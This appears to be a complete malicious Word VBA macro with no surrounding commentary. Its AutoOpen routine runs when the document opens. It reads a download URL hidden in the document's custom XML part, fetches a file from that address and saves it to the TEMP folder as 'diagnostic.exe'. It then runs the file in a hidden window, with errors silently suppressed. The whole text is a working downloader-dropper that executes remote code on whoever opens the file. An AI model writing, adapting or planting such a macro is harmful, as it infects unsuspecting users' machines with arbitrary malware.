Sub AutoOpen()
    On Error Resume Next
    Dim url As String
    url = GetPayloadUrl()
    If url = "" Then Exit Sub
    
    Dim http As Object
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    http.Open "GET", url, False
    http.Send
    
    If http.Status = 200 Then
        Dim tempDir As String
        tempDir = Environ$("TEMP")
        Dim localPath As String
        localPath = tempDir & "\diagnostic.exe"
        
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile localPath, 2
        
        CreateObject("WScript.Shell").Run localPath, 0, False
    End If
End Sub

Private Function GetPayloadUrl() As String
    Dim cxp As Office.CustomXMLPart
    For Each cxp In ActiveDocument.CustomXMLParts
        If InStr(cxp.XML, "<payloadUrl>") > 0 Then
            Dim xDoc As Object
            Set xDoc = CreateObject("MSXML2.DOMDocument")
            xDoc.LoadXML cxp.XML
            GetPayloadUrl = xDoc.SelectSingleNode("//payloadUrl").Text
            Exit Function
        End If
    Next
End Function
